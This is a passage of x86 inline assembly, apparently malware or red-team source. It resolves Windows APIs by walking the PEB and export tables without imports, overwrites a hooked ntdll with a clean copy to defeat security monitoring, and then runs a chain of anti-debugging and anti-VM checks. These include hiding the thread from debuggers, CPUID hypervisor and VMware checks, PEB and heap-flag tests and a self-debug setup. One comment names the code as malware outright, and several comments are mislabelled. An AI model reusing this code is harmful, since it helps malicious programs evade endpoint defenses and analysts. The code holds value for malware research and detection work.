		inc edi
		inc edi                 //Entry++
		loop fix_relocs_entry
		fix_relocs_next_base :
		add ebx, [ebx + 004h]
		jmp fix_relocs_block
		fix_relocs_end :

		
		////////////////find memcmp
		mov eax, fs : [30h];						eax = PEB
		mov eax, [eax + 0x0c];						eax = PPEB->PPEB_LDR_DATA
		mov eax, [eax + 0x14];						eax = PPEB->PPEB_LDR_DATA->InMemoryOrderModuleList.Flink
		mov eax, [eax];								eax = next link = ntdll LDR_MODULE entry
		mov eax, [eax + 0x10]; 16				    eax = ntdll LDR_MODULE DllBase
		mov   ebx, eax;								ebx = ntdll LDR_MODULE DllBase
		mov   eax, [ebx + 0x3c]; PE header VMA		eax = DllBase + e_lfanew(+0x3c) = PEHeader of kernel32
		mov   edi, [ebx + eax + 0x78];				edi = start of Export table relative offset  PE + 0x78 (i.e., offset 120 bytes) is the relative address(relative to DLL base address) of the export table
		add   edi, ebx;								edi = Export table VirtualAddress
		mov   ecx, [edi + 0x18];					ecx = export table + Number of names(+0x18) the counter to parse all functions in dll NumberOfNames
		mov   edx, [edi + 0x20];					edx = export table + Names table relative offset(+0x20)   DWORD AddressOfNames; //offset 0x20
		add   edx, ebx;								edx = +the base address of dll stored in ebx to obtain AddressOfNames Virtual Memory Address
		
		memcmp_loop_1 :
		dec ecx										
		mov esi, [edx + ecx * 4];					esi = AddressOfNames + NumberOfNames*4(because its an address) = the relative offset of the current name from the start of AddressOfNames 
		add esi, ebx;								esi = +the base address of dll stored in ebx to obtain the Virtual Memory Address of the current name
		cmp dword ptr[esi], 0x636d656d;				comparison of name, backwards order of bytes, memc = 6d 65 6d 63
		je memcmp_loop_2
		jmp memcmp_loop_1
		memcmp_loop_2 :
		cmp dword ptr[esi + 0x3], 0x00706d63;		opy = 63 6d 70 00
		je stopped_memcmp_loop;
		jmp memcmp_loop_1
		stopped_memcmp_loop:
		mov   edx, [edi + 0x24];					edx = Export table VirtualAddress + 0x24 = AddressOfNameOrdinals relative offset
		add   edx, ebx;								edx = +the base address of dll stored in ebx to obtain AddressOfNameOrdinals Virtual Memory Address
		mov   cx, [edx + 2 * ecx];					ecx = AddressOfNameOrdinals + 2*NumberOfNames to walk the function ordinals
		mov   edx, [edi + 0x1c];					edx = Export table VirtualAddress + 0x1c = AddressOfFunctions relative offset
		add   edx, ebx; Table address				edx = +the base address of dll stored in ebx to obtain AddressOfFunctions Virtual Memory Address
		mov   eax, [edx + 4 * ecx];					eax = AddressOfFunctions Virtual Memory Address + 4*ecx
		add   eax, ebx;								eax = +the base address of dll stored in ebx to obtain Function Virtual Memory Address of memcmp
		mov mem_cmp, eax

		//Find VirtualProtect
		mov eax, fs : [30h];						eax = PEB
		mov eax, [eax + 0x0c];						eax = PPEB->PPEB_LDR_DATA
		mov eax, [eax + 0x14];						eax = PPEB->PPEB_LDR_DATA->InMemoryOrderModuleList.Flink
		mov eax, [eax];								eax = next link = ntdll LDR_MODULE entry
		mov eax, [eax];								eax = next link = kernel32 LDR_MODULE entry
		mov eax, [eax + 0x10]; 16				    eax = kernel32 LDR_MODULE DllBase
		mov   ebx, eax;								ebx = kernel32 LDR_MODULE DllBase
		mov   eax, [ebx + 0x3c]; PE header VMA		eax = DllBase + e_lfanew(+0x3c) = PEHeader of kernel32
		mov   edi, [ebx + eax + 0x78];				edi = start of Export table relative offset  PE + 0x78 (i.e., offset 120 bytes) is the relative address(relative to DLL base address) of the export table
		add   edi, ebx;								edi = Export table VirtualAddress
		mov   ecx, [edi + 0x18];					ecx = export table + Number of names(+0x18) the counter to parse all functions in dll NumberOfNames
		mov   edx, [edi + 0x20];					edx = export table + Names table relative offset(+0x20)   DWORD AddressOfNames; //offset 0x20
		add   edx, ebx;								edx = +the base address of dll stored in ebx to obtain AddressOfNames Virtual Memory Address
		
		Virtual_Protect_loop_1 :
		dec ecx										
		mov esi, [edx + ecx * 4];					esi = AddressOfNames + NumberOfNames*4(because its an address) = the relative offset of the current name from the start of AddressOfNames 
		add esi, ebx;								esi = +the base address of dll stored in ebx to obtain the Virtual Memory Address of the current name
		cmp dword ptr[esi], 0x74726956;				comparison of name, backwards order of bytes, Virt = 56 69 72 74
		je Virtual_Protect_loop_2
		jmp Virtual_Protect_loop_1
		Virtual_Protect_loop_2 :
		cmp dword ptr[esi + 0xb], 0x00746365;		ect = 65 63 74 00
		je stopped_Virtual_Protect_loop;
		jmp Virtual_Protect_loop_1
		stopped_Virtual_Protect_loop:
		mov   edx, [edi + 0x24];					edx = Export table VirtualAddress + 0x24 = AddressOfNameOrdinals relative offset
		add   edx, ebx;								edx = +the base address of dll stored in ebx to obtain AddressOfNameOrdinals Virtual Memory Address
		mov   cx, [edx + 2 * ecx];					ecx = AddressOfNameOrdinals + 2*NumberOfNames to walk the function ordinals
		mov   edx, [edi + 0x1c];					edx = Export table VirtualAddress + 0x1c = AddressOfFunctions relative offset
		add   edx, ebx; Table address				edx = +the base address of dll stored in ebx to obtain AddressOfFunctions Virtual Memory Address
		mov   eax, [edx + 4 * ecx];					eax = AddressOfFunctions Virtual Memory Address + 4*ecx
		add   eax, ebx;								eax = +the base address of dll stored in ebx to obtain Function Virtual Memory Address of VirtualProtect
		mov Virtual_Protect, eax


		///////////Scan and Fix PEheader
		mov eax, pLibraryAddr;						eax = pDosHeader of ntdll loaded
		mov ebx, [eax + 0x3c];						ebx = e_lfanew(+0x3c) = offset to NtHeader
		add eax, ebx;								eax = NtHeader
		add eax, 0x54;								eax = SizeOfHeaders
		mov eax, [eax];								eax = 
		mov ebx, eax;								ebx = 
		push eax
		push pDllBase
		push pLibraryAddr
		mov eax, mem_cmp					
		call eax;									call = memcmp()
		jz mem_compare_sections
		push [ddOldProtect]
		push PAGE_EXECUTE_READWRITE
		push ebx
		push pDllBase
		call Virtual_Protect;						call = 
		jnz mem_cpy_header
		mem_cpy_header:
		push ebx
		push pLibraryAddr
		push pDllBase
		call mem_cpy;								call = 

		//////////////Scan and fix sections
		xor ecx, ecx
		mem_compare_sections :
		//Push Known VirtualSize
		mov eax, pLibraryAddr;						eax = pDosHeader of ntdll
		mov ebx, [eax + 0x3c];						ebx = e_lfanew(+0x3c) = offset to NtHeader
		add eax, ebx;								eax = NtHeader
		mov di, [eax + 0x06];						edi = pNtHeader->FileHeader.NumberOfSections	
		add eax, 0xf8;								eax = NtHeader + sizeof(IMAGE_NT_HEADERS) = pSectionHeader
		push [eax + 0x08];							push sections VirtualSize
		mov eax, [eax + 0x08];						eax = 
		mov Section_Virtual_Size, eax				
		//push Suspect Virtual Address
		mov eax, pDllBase
		mov ebx, [eax + 0x3c];						ebx = e_lfanew(+0x3c) = offset to NtHeader
		add eax, ebx;								eax = NtHeader
		add eax, 0xf8;								eax = NtHeader + sizeof(IMAGE_NT_HEADERS) = pSectionHeader
		mov edx, [eax + 0x0c];						edx = sections VirtualAddress
		add edx, pDllBase;							edx = pLibraryAddr + sections VirtualAddress
		push edx;
		//push Known VirtualAddress
		mov eax, pLibraryAddr;						eax = pDosHeader of ntdll
		mov ebx, [eax + 0x3c];						ebx = e_lfanew(+0x3c) = offset to NtHeader
		add eax, ebx;								eax = NtHeader
		add eax, 0xf8;								eax = NtHeader + sizeof(IMAGE_NT_HEADERS) = pSectionHeader
		mov edx, [eax + 0x0c];						edx = sections VirtualAddress
		add edx, pLibraryAddr;						edx = pLibraryAddr + sections VirtualAddress
		push edx;
		
		mov esi, ecx;								esi holds the counter ecx			
		call mem_cmp;								copy each section
		jnz mem_cpy_sections
		mem_cpy_sections:
		lea eax, [ddOldProtect]
		push eax
		push PAGE_EXECUTE_READWRITE
		push Section_Virtual_Size
		push pDllBase
		call Virtual_Protect
		push Section_Virtual_Size
		push pLibraryAddr
		push pDllBase
		call mem_cpy

		mov ecx, esi;								move the value from esi to ecx
		inc ecx;									increase ecx to go to next section
		mov eax, pLibraryAddr;						eax = pDosHeader of ntdll
		mov ebx, [eax + 0x3c];						ebx = e_lfanew(+0x3c) = offset to NtHeader
		add eax, ebx;								eax = NtHeader
		add eax, 0xf8;								eax = NtHeader + sizeof(IMAGE_NT_HEADERS) = pSectionHeader	
		imul ebx, ecx , 0x28
		add eax, ebx 
		cmp cx, di	
		jne mem_compare_sections
		jmp clean_up
		
		clean_up:
		/////////// find UnmapViewOfFile
		cmp pFile, NULL
		jne unmap_view_of_file
		unmap_view_of_file:
		mov eax, fs : [30h];						eax = PEB
		mov eax, [eax + 0x0c];						eax = PPEB->PPEB_LDR_DATA
		mov eax, [eax + 0x14];						eax = PPEB->PPEB_LDR_DATA->InMemoryOrderModuleList.Flink
		mov eax, [eax];								eax = next link = ntdll LDR_MODULE entry
		mov eax, [eax];								eax = next link = kernel32 LDR_MODULE entry
		mov eax, [eax + 0x10]; 16				    eax = kernel32 LDR_MODULE DllBase
		mov   ebx, eax;								ebx = kernel32 LDR_MODULE DllBase
		mov   eax, [ebx + 0x3c]; PE header VMA		eax = DllBase + e_lfanew(+0x3c) = PEHeader of kernel32
		mov   edi, [ebx + eax + 0x78];				edi = start of Export table relative offset  PE + 0x78 (i.e., offset 120 bytes) is the relative address(relative to DLL base address) of the export table
		add   edi, ebx;								edi = Export table VirtualAddress
		mov   ecx, [edi + 0x18];					ecx = export table + Number of names(+0x18) the counter to parse all functions in dll NumberOfNames
		mov   edx, [edi + 0x20];					edx = export table + Names table relative offset(+0x20)   DWORD AddressOfNames; //offset 0x20
		add   edx, ebx;								edx = +the base address of dll stored in ebx to obtain AddressOfNames Virtual Memory Address
		
		unmap_view_of_file_loop_1 :
		dec ecx										
		mov esi, [edx + ecx * 4];					esi = AddressOfNames + NumberOfNames*4(because its an address) = the relative offset of the current name from the start of AddressOfNames 
		add esi, ebx;								esi = +th e base address of dll stored in ebx to obtain the Virtual Memory Address of the current name
		cmp dword ptr[esi], 0x616d6e55;				comparison of name, backwards order of bytes, Unma = 55 6e 6d 61
		je unmap_view_of_file_loop_2
		jmp unmap_view_of_file_loop_1
		unmap_view_of_file_loop_2 :
		cmp dword ptr[esi + 0xc], 0x00656c69;		ile = 69 6c 65 00
		je stopped_unmap_view_of_file_loop;
		jmp unmap_view_of_file_loop_1
		stopped_unmap_view_of_file_loop:
		mov   edx, [edi + 0x24];					edx = Export table VirtualAddress + 0x24 = AddressOfNameOrdinals relative offset
		add   edx, ebx;								edx = +the base address of dll stored in ebx to obtain AddressOfNameOrdinals Virtual Memory Address
		mov   cx, [edx + 2 * ecx];					ecx = AddressOfNameOrdinals + 2*NumberOfNames to walk the function ordinals
		mov   edx, [edi + 0x1c];					edx = Export table VirtualAddress + 0x1c = AddressOfFunctions relative offset
		add   edx, ebx; Table address				edx = +the base address of dll stored in ebx to obtain AddressOfFunctions Virtual Memory Address
		mov   eax, [edx + 4 * ecx];					eax = AddressOfFunctions Virtual Memory Address + 4*ecx
		add   eax, ebx;								eax = +the base address of dll stored in ebx to obtain Function Virtual Memory Address of UnmapViewOfFIle
		////////call UnmapViewOfFile 
		push pFile
		call eax
		///////////////find NtClose/CloseHandle					
		cmp hMap, NULL
		jne Close_Handle
		Close_Handle:
		mov eax, fs : [30h];						eax = PEB
		mov eax, [eax + 0x0c];						eax = PPEB->PPEB_LDR_DATA
		mov eax, [eax + 0x14];						eax = PPEB->PPEB_LDR_DATA->InMemoryOrderModuleList.Flink
		mov eax, [eax];								eax = next link = ntdll LDR_MODULE entry
		//mov eax, [eax];							eax = next link = kernel32 LDR_MODULE entry
		mov eax, [eax + 0x10]; 16				    eax = ntdll LDR_MODULE DllBase
		mov   ebx, eax;								ebx = ntdll LDR_MODULE DllBase
		mov   eax, [ebx + 0x3c]; PE header VMA		eax = DllBase + e_lfanew(+0x3c) = PEHeader of kernel32
		mov   edi, [ebx + eax + 0x78];				edi = start of Export table relative offset  PE + 0x78 (i.e., offset 120 bytes) is the relative address(relative to DLL base address) of the export table
		add   edi, ebx;								edi = Export table VirtualAddress
		mov   ecx, [edi + 0x18];					ecx = export table + Number of names(+0x18) the counter to parse all functions in dll NumberOfNames
		mov   edx, [edi + 0x20];					edx = export table + Names table relative offset(+0x20)   DWORD AddressOfNames; //offset 0x20
		add   edx, ebx;								edx = +the base address of dll stored in ebx to obtain AddressOfNames Virtual Memory Address
		
		Close_Handle_loop_1 :
		dec ecx										
		mov esi, [edx + ecx * 4];					esi = AddressOfNames + NumberOfNames*4(because its an address) = the relative offset of the current name from the start of AddressOfNames 
		add esi, ebx;								esi = +th e base address of dll stored in ebx to obtain the Virtual Memory Address of the current name
		//cmp dword ptr[esi], 0x736f6c43;			comparison of name, backwards order of bytes, Clos = 43 6c 6f 73
		cmp dword ptr[esi], 0x6c43744e;				comparison of name, backwards order of bytes, NtCl = 4e 74 43 6c
		je Close_Handle_loop_2
		jmp Close_Handle_loop_1
		Close_Handle_loop_2 :
		//cmp dword ptr[esi + 0x8], 0x00656c64;		dle = 64 6c 65 00
		cmp dword ptr[esi + 0x4], 0x0065736f;		ose = 6f 73 65 00
		je stopped_Close_Handle_loop;
		jmp Close_Handle_loop_1
		stopped_Close_Handle_loop:
		mov   edx, [edi + 0x24];					edx = Export table VirtualAddress + 0x24 = AddressOfNameOrdinals relative offset
		add   edx, ebx;								edx = +the base address of dll stored in ebx to obtain AddressOfNameOrdinals Virtual Memory Address
		mov   cx, [edx + 2 * ecx];					ecx = AddressOfNameOrdinals + 2*NumberOfNames to walk the function ordinals
		mov   edx, [edi + 0x1c];					edx = Export table VirtualAddress + 0x1c = AddressOfFunctions relative offset
		add   edx, ebx; Table address				edx = +the base address of dll stored in ebx to obtain AddressOfFunctions Virtual Memory Address
		mov   eax, [edx + 4 * ecx];					eax = AddressOfFunctions Virtual Memory Address + 4*ecx
		add   eax, ebx;								eax = +the base address of dll stored in ebx to obtain Function Virtual Memory Address of NtClose
		/////call NtClose on hMap, hFile handlers
		mov Close_Handle_function, eax
		push hMap
		call Close_Handle_function
		cmp hFile, -1;
		jne close_handle_hFile
		close_handle_hFile:
		push hFile
		call Close_Handle_function

		/////////Find VirtualFree
		mov eax, fs : [30h];						eax = PEB
		mov eax, [eax + 0x0c];						eax = PPEB->PPEB_LDR_DATA
		mov eax, [eax + 0x14];						eax = PPEB->PPEB_LDR_DATA->InMemoryOrderModuleList.Flink
		mov eax, [eax];								eax = next link = ntdll LDR_MODULE entry
		mov eax, [eax];
		mov eax, [eax + 0x10]; 16				    eax = kernel32 LDR_MODULE DllBase
		mov   ebx, eax;								ebx = kernel32 LDR_MODULE DllBase
		mov   eax, [ebx + 0x3c]; PE header VMA		eax = DllBase + e_lfanew(+0x3c) = PEHeader of kernel32
		mov   edi, [ebx + eax + 0x78];				edi = start of Export table relative offset  PE + 0x78 (i.e., offset 120 bytes) is the relative address(relative to DLL base address) of the export table
		add   edi, ebx;								edi = Export table VirtualAddress
		mov   ecx, [edi + 0x18];					ecx = export table + Number of names(+0x18) the counter to parse all functions in dll NumberOfNames
		mov   edx, [edi + 0x20];					edx = export table + Names table relative offset(+0x20)   DWORD AddressOfNames; //offset 0x20
		add   edx, ebx;								edx = +the base address of dll stored in ebx to obtain AddressOfNames Virtual Memory Address
		
		Virtual_Free_loop_1 :
		dec ecx										
		mov esi, [edx + ecx * 4];					esi = AddressOfNames + NumberOfNames*4(because its an address) = the relative offset of the current name from the start of AddressOfNames 
		add esi, ebx;								esi = +the base address of dll stored in ebx to obtain the Virtual Memory Address of the current name
		cmp dword ptr[esi], 0x74726956;				comparison of name, backwards order of bytes, Virt = 56 69 72 74
		je Virtual_Free_loop_2
		jmp Virtual_Free_loop_1
		Virtual_Free_loop_2 :
		cmp dword ptr[esi + 0x8], 0x00656572;		ree = 72 65 65 00
		je stopped_Virtual_Free_loop;
		jmp Virtual_Free_loop_1
		stopped_Virtual_Free_loop:
		mov   edx, [edi + 0x24];					edx = Export table VirtualAddress + 0x24 = AddressOfNameOrdinals relative offset
		add   edx, ebx;								edx = +the base address of dll stored in ebx to obtain AddressOfNameOrdinals Virtual Memory Address
		mov   cx, [edx + 2 * ecx];					ecx = AddressOfNameOrdinals + 2*NumberOfNames to walk the function ordinals
		mov   edx, [edi + 0x1c];					edx = Export table VirtualAddress + 0x1c = AddressOfFunctions relative offset
		add   edx, ebx; Table address				edx = +the base address of dll stored in ebx to obtain AddressOfFunctions Virtual Memory Address
		mov   eax, [edx + 4 * ecx];					eax = AddressOfFunctions Virtual Memory Address + 4*ecx
		add   eax, ebx;								eax = +the base address of dll stored in ebx to obtain Function Virtual Memory Address of VirtualFree
		///////call VirtualFree 
		push MEM_RELEASE
		push 0
		push pLibraryAddr
		call eax

		
		
		jmp ntsetinformation_thread
			
	//////////////////////////////////////////////////////////////////////////////////////Start Of Antidebug/AntiVm techniques
	/////////////////////NtSetInformationThread								
	
	
	ntsetinformation_thread:
	///////////resolve NtSetInformationThread address
		mov eax, fs : [30h];						
		mov eax, [eax + 0x0c]; 12
		mov eax, [eax + 0x14]; 20
		mov eax, [eax];							
		mov eax, [eax + 0x10]; 16

		mov   ebx, eax;
		mov   eax, [ebx + 0x3c];               
		mov   edi, [ebx + eax + 0x78];		   
		add   edi, ebx;						   
		mov   ecx, [edi + 0x18];			   
		mov   edx, [edi + 0x20];			  
		add   edx, ebx;						   
							
		nt_set_information_thread_loop :
		dec ecx
		mov esi, [edx + ecx * 4];					Store the relative offset of the name
		add esi, ebx;								Set esi to the VMA of the current name
		cmp dword ptr[esi], 0x6553744e;				backwards order of bytes Chec 43 68 65 63 //NtQu 4e 74 53 65
		je nt_set_information_thread_loop1
		jmp nt_set_information_thread_loop
		nt_set_information_thread_loop1 :
		cmp dword ptr[esi + 0x12], 0x64616572										//read 72 65 61 64
		je stopped_nt_set_information_thread_loop;
		jmp nt_set_information_thread_loop
		stopped_nt_set_information_thread_loop :
		mov   edx, [edi + 0x24];					Table of ordinals relative
		add   edx, ebx;								Table of ordinals
		mov   cx, [edx + 2 * ecx];					function ordinal
		mov   edx, [edi + 0x1c];					Address table relative offset
		add   edx, ebx;								Table address
		mov   eax, [edx + 4 * ecx];					ordinal offset
		add   eax, ebx;								Function VMA; Eax holds address of VirtualFree
		mov nt_set_information_thread, eax
		////////////the actual call to hide the main thread from debugger
		push 0
		push 0
		push 11h;									ThreadHideFromDebugger
		push - 2;									GetCurrentThread()
		call nt_set_information_thread
		nop
		nop
		jmp cpu_id1
	
	////////////CPUID1
	//This instruction is executed with EAX=1 as input, the return value describes the processors features. 
	//The 31st bit of ECX on a physical machine will be equal to 0. On a guest VM it will equal to 1.
	
		cpu_id1:
		xor eax, eax
		inc eax
		cpuid
		bt ecx, 0x1f
		jb switch_desktop_1
		//jmp continue_execution
		jmp antistepover
	
	
	////////////////////////////////////antistep-over										[CHECKED]
	
	antistepover:
		xor		ecx, ecx
		inc		ecx
		call	anti_step_1
		anti_step_1 :
		pop		esi
		add		esi, 9
		lea 	edi, [esi + 1]
		rep 	movsb
		anti_step_1_loc1 :
		mov 	dl, 0x90
		xor eax, eax
		anti_step_1_loc2 :
		cmp 	dl, 0xcc
		je switch_desktop_1
		setz 	al
		
		jmp cpu_id2
		
	
	
	////////////CPUID2
	//Hypervisor brand”: by calling CPUID with EAX=40000000 as input,1 the malware will get, as the return value,
	//the virtualization vendor string in EBX, ECX, EDX.
	
		cpu_id2:
		xor eax, eax
		mov eax, 0x40000000
		cpuid
		cmp ebx, 0x61774d56 ////////////56 6d 57 61 Vmwa
		je switch_desktop_1
		jmp peb_beingdebugged_spec_exec
	
	
	////////////////////PEB being debugged with speculative execution						

	
	peb_beingdebugged_spec_exec:
		xor ebx, ebx
		call spec_exec

		spec_exec :
		push ebp
		mov ebp, esp
		mov eax, 0xffffffff
		_emit 0xc7; xbegin:
		_emit 0xf8
		_emit 0
		if_xbegin_neg :
		cmp eax, 0xffffffff; -1
		jnz if_xbegin_not_neg
		mov     eax, fs:[30h]; PEB x64(32: fs:[30h])
		mov     al, [eax + 68h]; BeingDebugged x64(32: +68h)
		mov     bl, al; al = 1->debug, al = 0->no debug ; end of the speculative execution
		_emit 0x0f; xend:
		_emit 0x01
		_emit 0xd5
		jmp end_if_xbegin

		if_xbegin_not_neg :
		mfence
		end_if_xbegin :
		cmp	bl, 0
		jne switch_desktop_1

		mov esp, ebp
		pop ebp
		jmp ntglobalflag
		

	///////////////////////3 Check PEB.NtGlobalFlag													
	
	ntglobalflag:
		mov eax, fs : [30h]; Process Environment Block
		mov al, [eax + 68h]; NtGlobalFlag
		and al, 70h
		cmp al, 70h
		je switch_desktop_1
		jmp heapflags
		
	
	
	///////////////////////4.Heap Flags																
	///////////////////////GetVersion address	as  getversion
	
	
	heapflags:
		////////////GetVersion
		mov eax, fs : [30h]
		mov eax, [eax + 0x0c]; 			 
		mov eax, [eax + 0x14]; 	 
		mov eax, [eax]
		mov eax, [eax]
		mov eax, [eax + 0x10]; 16		
		mov   ebx, eax; 
		mov   eax, [ebx + 0x3c]; PE header VMA
		mov   edi, [ebx + eax + 0x78]; Export table relative offset  PE + 0x78 (i.e., offset 120 bytes) is the relative address(relative to DLL base address) of the export table
		add   edi, ebx; Export table VMA
		mov   ecx, [edi + 0x18]; Number of names
		mov   edx, [edi + 0x20]; Names table relative offset   DWORD AddressOfNames; //offset 0x20
		add   edx, ebx; Names table VMA
		
		get_version_loop :
		dec ecx
		mov esi, [edx + ecx * 4];			  Store the relative offset of the name
		add esi, ebx;					      Set esi to the VMA of the current name
		cmp dword ptr[esi], 0x56746547;       backwards order of bytes Chec 43 68 65 63 //GetV 47 65 74 56
		je get_version_loop1
		jmp get_version_loop
		get_version_loop1 :
		cmp dword ptr[esi + 0x7], 0x006e6f69										//ion    69 6f 6e 20
		je stopped_get_version;
		jmp get_version_loop
		stopped_get_version :
		mov   edx, [edi + 0x24]; Table of ordinals relative
		add   edx, ebx; Table of ordinals
		mov   cx, [edx + 2 * ecx]; function ordinal
		mov   edx, [edi + 0x1c]; Address table relative offset
		add   edx, ebx; Table address
		mov   eax, [edx + 4 * ecx]; ordinal offset
		add   eax, ebx; Function VMA; Eax holds address of GetVersion
		mov getversion, eax
		/////////////////////4.1FLAGS     																
		call getversion
		cmp al, 6
		cmc
		sbb ebx, ebx
		and ebx, 34h
		mov eax, fs:[30h]; Process Environment Block
		mov eax, [eax + 18h]; get process heap base
		mov eax, [eax + ebx + 0ch]; Flags; not HEAP_SKIP_VALIDATION_CHECKS
		bswap eax
		and al, 0efh
		cmp eax, 62000040h; HEAP_GROWABLE + HEAP_TAIL_CHECKING_ENABLED + HEAP_VALIDATE_PARAMETERS_ENABLED + HEAP_FREE_CHECKING_ENABLED  reversed by bswap
		je switch_desktop_1
		jmp forceflags
		///////////////////////////4.2FORCE FLAGS	
		forceflags :
		call getversion
		cmp al, 6
		cmc
		sbb ebx, ebx
		and ebx, 34h
		mov eax, fs:[30h]; Process Environment Block
		mov eax, [eax + 18h]; get process heap base
		cmp[eax + ebx + 10h], 40000060h; ForceFlags = HEAP_TAIL_CHECKING_ENABLED + HEAP_FREE_CHECKING_ENABLED + HEAP_VALIDATE_PARAMETERS_ENABLED
		je switch_desktop_1
		
		jmp number_of_processors_2
		

	
	////////////////Number of processors from PEB

	number_of_processors_2:
		mov eax, fs : [30h]
		mov eax, [eax + 0x64]
		cmp eax, 1
		jbe switch_desktop_1
		jmp selectors
	
	
	///////////////Number of Processors from getsysteminfo<=1
	/*DWORD get_system_info;
	__asm {
		number_of_processors:
		mov eax, fs:[30h]
		mov eax, [eax + 0x0c]; 12
		mov eax, [eax + 0x14]; 20
		mov eax, [eax]
		mov eax, [eax]
		mov eax, [eax + 0x10]; 16
		mov   ebx, eax;
		mov   eax, [ebx + 0x3c];               get PE header Virtual Memory Address of kernel32
		mov   edi, [ebx + eax + 0x78];		   get Export table relative offset from peheader start 0x78
		add   edi, ebx;						   get Export table directory(Type IMAGE_EXPORT_DIRECTORY) (VA)
		mov   ecx, [edi + 0x18];			   get ExportDirectoryTable Number of name Pointers
		mov   edx, [edi + 0x20];			   get Export Table Names table(RVA)
		add   edx, ebx;						   get Export Table Names table(VA)

		get_system_info_loop:
		dec ecx
		mov esi, [edx + ecx * 4];			  Store the relative offset of the name
		add esi, ebx;					      Set esi to the VMA of the current name
		cmp dword ptr[esi], 0x53746547;       backwards order of bytes Chec 43 68 65 63 //GetS 47 65 74 53
		je get_system_info_loop1
		jmp get_system_info_loop
		get_system_info_loop1 :
		cmp dword ptr[esi + 0x9], 0x6f666e49					//Info  49 6e 66 6f
		je stopped_get_system_info_loop;
		jmp get_system_info_loop
		stopped_get_system_info_loop :
		mov   edx, [edi + 0x24]; Table of ordinals relative
		add   edx, ebx; Table of ordinals
		mov   cx, [edx + 2 * ecx]; function ordinal
		mov   edx, [edi + 0x1c]; Address table relative offset
		add   edx, ebx; Table address
		mov   eax, [edx + 4 * ecx]; ordinal offset
		add   eax, ebx; Function VMA; Eax holds address of OutputDebugStringA
		mov get_system_info, eax

		jmp get_system_info_loc1
		get_system_info_loc1_back :
		pop esi
		push esi
		call get_system_info
		mov edx, [esi + 14h]; SYSTEM_INFO.dwNumberOfProcessors
		cmp edx, 1
		jbe switch_desktop_1
		jmp selfdebug
		get_system_info_loc1 : // sizeof(SYSTEM_INFO) db 24h dup(? )
		call get_system_info_loc1_back

		bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90)
		bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90)
		bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90)
		bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90)
	}
	
	//////////////////////// Create process self debug										[CHECKED]
	DWORD wait_for_debug_event;
	DWORD exit_process;
	DWORD get_startup_info_A;
	DWORD get_last_error;
	DWORD get_command_line_A;
	DWORD nt_create_process;
	DWORD create_mutex_A;
	DWORD continue_debug_event;
	__asm {
	selfdebug:
		///////////////Find WaitForDebugEvent
		mov eax, fs : [30h]
		mov eax, [eax + 0x0c]; 12
		mov eax, [eax + 0x14]; 20
		mov eax, [eax]
		mov eax, [eax]
		mov eax, [eax + 0x10]; 16
		mov   ebx, eax;
		mov   eax, [ebx + 0x3c];               get PE header Virtual Memory Address of kernel32
		mov   edi, [ebx + eax + 0x78];		   get Export table relative offset from peheader start 0x78
		add   edi, ebx;						   get Export table directory(Type IMAGE_EXPORT_DIRECTORY) (VA)
		mov   ecx, [edi + 0x18];			   get ExportDirectoryTable Number of name Pointers
		mov   edx, [edi + 0x20];			   get Export Table Names table(RVA)
		add   edx, ebx;						   get Export Table Names table(VA)
		
		wait_for_debug_event_loop :
		dec ecx
		mov esi, [edx + ecx * 4];			  Store the relative offset of the name
		add esi, ebx;					      Set esi to the VMA of the current name
		cmp dword ptr[esi], 0x74696157;       backwards order of bytes Chec 43 68 65 63 //Wait 57 61 69 74
		je wait_for_debug_event_loop1
		jmp wait_for_debug_event_loop
		wait_for_debug_event_loop1 :
		cmp dword ptr[esi + 0xe], 0x00746e65										//ent  65 6e 74 00
		je stopped_wait_for_debug_event_loop;
		jmp wait_for_debug_event_loop
		stopped_wait_for_debug_event_loop :
		mov   edx, [edi + 0x24]; Table of ordinals relative
		add   edx, ebx; Table of ordinals
		mov   cx, [edx + 2 * ecx]; function ordinal
		mov   edx, [edi + 0x1c]; Address table relative offset
		add   edx, ebx; Table address
		mov   eax, [edx + 4 * ecx]; ordinal offset
		add   eax, ebx; Function VMA; Eax holds address of VirtualFree
		mov wait_for_debug_event, eax
		///////////////Find ExitProcess
		mov eax, fs:[30h]
		mov eax, [eax + 0x0c]; 12
		mov eax, [eax + 0x14]; 20
		mov eax, [eax]
		mov eax, [eax]
		mov eax, [eax + 0x10]; 16
		mov   ebx, eax;
		mov   eax, [ebx + 0x3c];               get PE header Virtual Memory Address of kernel32
		mov   edi, [ebx + eax + 0x78];		   get Export table relative offset from peheader start 0x78
		add   edi, ebx;						   get Export table directory(Type IMAGE_EXPORT_DIRECTORY) (VA)
		mov   ecx, [edi + 0x18];			   get ExportDirectoryTable Number of name Pointers
		mov   edx, [edi + 0x20];			   get Export Table Names table(RVA)
		add   edx, ebx;						   get Export Table Names table(VA)
	
		exit_process_loop :
		dec ecx
		mov esi, [edx + ecx * 4];			  Store the relative offset of the name
		add esi, ebx;					      Set esi to the VMA of the current name
		cmp dword ptr[esi], 0x74697845;       backwards order of bytes Chec 43 68 65 63 //Exit 45 78 69 74
		je exit_process_loop1
		jmp exit_process_loop
		exit_process_loop1 :
		cmp dword ptr[esi + 0x7], 0x73736563										//cess  63 65 73 73
		je stopped_exit_process_loop;
		jmp exit_process_loop

		stopped_exit_process_loop :
		mov   edx, [edi + 0x24]; Table of ordinals relative
		add   edx, ebx; Table of ordinals
		mov   cx, [edx + 2 * ecx]; function ordinal
		mov   edx, [edi + 0x1c]; Address table relative offset
		add   edx, ebx; Table address
		mov   eax, [edx + 4 * ecx]; ordinal offset
		add   eax, ebx; Function VMA; Eax holds address of VirtualFree
		mov exit_process, eax

		////////////////////////Find GetStartUpInfoA
		mov eax, fs:[30h]
		mov eax, [eax + 0x0c]; 12
		mov eax, [eax + 0x14]; 20
		mov eax, [eax]
		mov eax, [eax]
		mov eax, [eax + 0x10]; 16
		mov   ebx, eax;
		mov   eax, [ebx + 0x3c];               get PE header Virtual Memory Address of kernel32
		mov   edi, [ebx + eax + 0x78];		   get Export table relative offset from peheader start 0x78
		add   edi, ebx;						   get Export table directory(Type IMAGE_EXPORT_DIRECTORY) (VA)
		mov   ecx, [edi + 0x18];			   get ExportDirectoryTable Number of name Pointers
